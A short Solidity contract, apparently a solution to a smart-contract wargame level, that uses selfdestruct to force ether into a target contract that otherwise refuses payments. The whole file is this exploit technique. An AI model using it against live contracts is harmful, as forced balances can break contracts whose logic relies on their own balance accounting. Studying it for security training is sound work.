// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract ForceAttack {

  function attack(address _forceAddr) external payable {
    require(msg.value > 0, "require eth");
    selfdestruct(payable(_forceAddr));
  }
}